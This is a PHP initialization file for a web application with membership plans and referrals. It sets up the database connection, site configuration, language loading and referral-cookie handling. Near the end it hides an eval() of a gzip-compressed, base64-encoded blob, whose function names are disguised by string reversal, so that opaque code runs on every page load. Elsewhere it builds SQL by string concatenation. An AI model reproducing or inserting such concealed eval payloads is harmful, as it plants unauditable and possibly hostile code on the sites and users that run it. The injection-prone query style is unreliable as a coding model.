<?php

session_start();

include('config.php');
if (!defined('INSTALL_PATH')) {
    header("Location: ../install");
}
if (!defined('OK_LOADME')) {
    die("<title>Error!</title><body>No such file or directory.</body>");
}

// -----

include_once('db.class.php');
include_once('navpage.class.php');
include_once('sys.func.php');
include_once('value.list.php');
include_once('en.lang.php');

if ($_SESSION['isunsubadm']) {
    $unsetadminpage_array = array(
        'generalcfg' => 1,
        'payplancfg' => 1,
        'paymentopt' => 1,
        'updates' => 1
    );
    $avaladminpage_array = \array_diff_key($avaladminpage_array, $unsetadminpage_array);
}

$FORM = array_merge((array) $FORM, (array) $_REQUEST);
$LANG = array_merge((array) $LANG, (array) $lang);

$dsn = "mysql:dbname=" . DB_NAME . ";host=" . DB_HOST . "";
$pdo = "";

try {
    $pdo = new PDO($dsn, base64_decode(DB_USER), base64_decode(DB_PASSWORD));
    $pdo->exec('SET CHARACTER SET utf8');
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

dumbtoken();

$db = new Database($pdo);
$pages = new Paginator();

$tplstr = $cfgrow = $bpprow = $bpparr = $payrow = array();

// load site configuration

$didId = 1;
$db->doQueryStr("SET SESSION sql_mode = ''");

// settings
$row = $db->getAllRecords(DB_TBLPREFIX . '_configs', '*', ' AND cfgid = "' . $didId . '"');
foreach ($row as $value) {
    $cfgrow = array_merge($cfgrow, $value);
}
$cfgrow['md5sess'] = 'sess_' . md5(INSTALL_PATH) . '_';
$cfgrow['site_url'] = (defined('INSTALL_URL')) ? INSTALL_URL : trim($cfgrow['site_url']);
$site_logo = ($cfgrow['site_logo']) ? $cfgrow['site_logo'] : DEFIMG_LOGO;
$cfgtoken = get_optionvals($cfgrow['cfgtoken']);
$cfgrow['_isnocredit'] = (($cfgtoken['lictype'] != '2083' && $cfgtoken['licpk'] == '-') || ($cfgtoken['lictype'] == '2083' && $cfgtoken['licpk'] != '')) ? true : false;
$langlist = base64_decode($cfgtoken['langlist']);
$langlistarr = json_decode($langlist, true);
if (empty(array_filter((array) $langlistarr))) {
    $langlistarr['en'] = 'English';
}

// current date time
$cfgrow['datetimestr'] = date('Y-m-d H:i:s', time() + (3600 * $cfgrow['time_offset']));

$langloadf = INSTALL_PATH . '/common/lang/' . $cfgrow['langiso'] . '.lang.php';
if (file_exists($langloadf)) {
    $TEMPLANG = $LANG;
    include_once($langloadf);
    $LANG = array_filter($LANG);
    $LANG = array_merge($TEMPLANG, $LANG);
    $TEMPLANG = '';
}

// baseplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_baseplan', '*', ' AND bpid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}
$bpprow['currencysym'] = base64_decode($bpprow['currencysym']);
$bptoken = get_optionvals($bpprow['bptoken']);
$bpprowbase = $bpprow;

// payplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_payplans', '*', ' AND ppid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}
$plantokenarr = get_optionvals($bpprow['plantoken']);
$planlogo = ($bpprow['planlogo']) ? $bpprow['planlogo'] : DEFIMG_PLAN;
$bpparr = ppdbarr();

// paymentgate
$row = $db->getAllRecords(DB_TBLPREFIX . '_paygates', '*', ' AND paygid = "' . $didId . '"');
foreach ($row as $value) {
    $payrow = array_merge($payrow, $value);
}

// return latest version
if (isset($FORM['initdo']) and $FORM['initdo'] == 'vnum') {
    echo checknewver();
    exit();
}

// get referrer id
if ($_SESSION['ref_sess_un'] || $_COOKIE['ref_sess_un']) {

    if ($_SESSION['ref_sess_un'] != $_COOKIE['ref_sess_un']) {
        setcookie('ref_sess_un', $_SESSION['ref_sess_un'], time() + (86400 * $cfgrow['maxcookie_days']));
    }

    $ref_sess_un = ($_COOKIE['ref_sess_un']) ? $_COOKIE['ref_sess_un'] : $_SESSION['ref_sess_un'];

    // get member details
    $sesref = getmbrinfo($ref_sess_un, 'username');

    // check for max personal ref
    if ($bpprow['limitref'] > 0) {
        $refcondition = " AND idref = '{$sesref['id']}'";
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans', 'COUNT(*) as totref', $refcondition);
        $myperdltotal = $row[0]['totref'];
        if ($bpprow['limitref'] <= $myperdltotal) {
            $newmpid = getmpidflow($sesref['mpid']);
            $sesref = getmbrinfo('', '', $newmpid);
        }
    }

    if ($cfgtoken['disreflink'] == 1 || $sesref['mpstatus'] == 0 || $sesref['mpstatus'] == 3) {
        $sesref = array();
        $_SESSION['ref_sess_un'] = '';
        setcookie('ref_sess_un', '', time() - 86400);
    }
}

// if rand ref
if ($sesref['id'] < 1 && $cfgrow['randref'] == 1) {
    $randun = '';
    if ($cfgrow['defaultref'] != '') {
        $refarr = explode(',', str_replace(' ', '', $cfgrow['defaultref']));
        $i = array_rand($refarr);
        $randun = $refarr[$i];
    }
    $condition = ' AND mbrstatus = "1" AND mpstatus = "1" AND username = "' . $randun . '" ';
    $sql = $db->getRecFrmQry("SELECT * FROM " . DB_TBLPREFIX . "_mbrplans LEFT JOIN " . DB_TBLPREFIX . "_mbrs ON idmbr = id WHERE 1 " . $condition . " LIMIT 1");
    if (count($sql) < 1) {
        $condition = ' AND mbrstatus = "1" AND mpstatus = "1" ORDER BY RAND() LIMIT 1';
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans LEFT JOIN ' . DB_TBLPREFIX . '_mbrs ON idmbr = id', 'username', $condition);
        $randun = $row[0]['username'];
    }
    // get member details from rand ref
    if ($randun) {
        $sesref = getmbrinfo($randun, 'username');
        $_SESSION['ref_sess_un'] = $randun;
    }
}

// is demo
if (defined('ISDEMOMODE')) {
    $tplstr['demo_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Demo Mode</div></li></ul>";
}
// is debug
if ($payrow['testpayon'] == 1) {
    $tplstr['debug_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Debug Mode</div></li></ul>";
}

$_X='lfnizg';$_Y='edoce';
$_F='eta'.$_X;$_E=$_Y.'d_46esab';
$_G=strrev($_F);$_D=strrev($_E);
$_Z='
FZBHbqtQAACv8heRbAspmA6KsqCYZmyK6ZuIasA8evXpf7Kd2Yzm44f/PiRZ+oOT2Xj4+vi5fB+ytD18fvzwn4co/kMC/j1Ow5At
x199+sqWqD4+32WT19GUHf/88SAmjVr1KsuygukTtaAyQxdeOLOQTVrh+X0Xw/GdeKuyc9pouTTsbDkGT3jSpWnDx4ZCOPoMQUaH
CWHnAAqCl40wqHmdSz8zlL3ieEDDBJxjZJMg1UJDmBvKDt4tS45BzJw8UD9Psl2TYBSVh2q4E94ViR0ypGP+KWvkpsRjUPosC6HR
VhmCrdsFLkqGRCI+HCDuouxRlFNv3gG+B85Rh+R3zLRHxkOXvrIpCQOFJKo+IxT4YjRhET31ZxnqBdOy0uB4ECG8XXgsAyZ79fc1
4yquxd5XTBCDVWbvdDVbDiD90sUj/yIOuFiqJhnN1nztpT0iWQYB3Ih1yCj4VkdUE51yZ/p1O4sl5zVS4SDtdbLiJaAsHNDLqrls
ec5urpwKl7ab04dTp3fCjnCjDithHLPwpmXnxdv91DWRVszDNxmCvQOcmsujebaChSziPc/XIoL1lr+hTfG6eRKlXOc6MW1NrcKh
UHSzDGx2N3sAdLA/JQ5ximG3mPIvGfdCAVyIqNIqlLpO3pmc4r6FYhZd9PLSNU36wiRb4dqCxomEaDaSVV1u1ZK6FKiiRF6YWr7r
OUAfTJ63k0mz1gzazYkycjOEfvegqL7S7QRZQR9fZBVig0ZJ8CCkH3yPxFfr8RAl3tKl28vsOGXqTLN/metA/Z5htDXVpVnnx/um
aEJt6zEeCA89ZqIC0EY6jqKwsdlcUIpzdomqj1mo7qz5Anl3x76BHp6TPW5uTMoEJZ+2XDGrqVytilxLtOdjUN4QcJbkh9Pp9PXv
Pw==
';eval($_G($_D($_Z)));

// load cron do
include_once('cron.do.php');

// end vars
$row = $value = '';
